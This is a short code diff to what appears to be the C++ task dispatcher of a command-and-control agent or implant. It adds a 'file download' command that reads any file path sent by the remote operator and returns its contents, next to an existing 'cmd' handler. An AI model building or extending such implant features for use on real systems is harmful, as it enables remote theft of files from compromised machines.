@@ -5,7 +5,7 @@
 #include "../modules/ls.h"
 #include "../data/msgpack/msgpack.h"
 #include "settings.h"
-
+#include "../modules/files.h"
 //take in the mapped object, after converted from msgpack
 //all command splitting/overhead logic is done here, then passed to the appropriate modules
 nlohmann::json command_tree(nlohmann::json task_data) {
@@ -151,6 +151,25 @@ nlohmann::json command_tree(nlohmann::json task_data) {
         //could have a value, ex, prior_dir as a value too. 
         return result;
 
+    }
+    else if (task_name == "file download") {
+        nlohmann::json result;
+        add_text_result(result, "message", "yunowork");
+
+        //get file path from command
+        std::string file_path = task_data["task"]["args"]["file_path"];
+
+        std::string file_contents = get_file(file_path);
+
+        if (file_contents.empty()) {
+            add_text_result(result, "message", "File appears to be empty");
+            return result;
+
+        }
+
+        add_bytes_result(result, "file_contents", file_contents);
+
+        return result;
     }
     else if (task_name == "cmd") {
         nlohmann::json result;
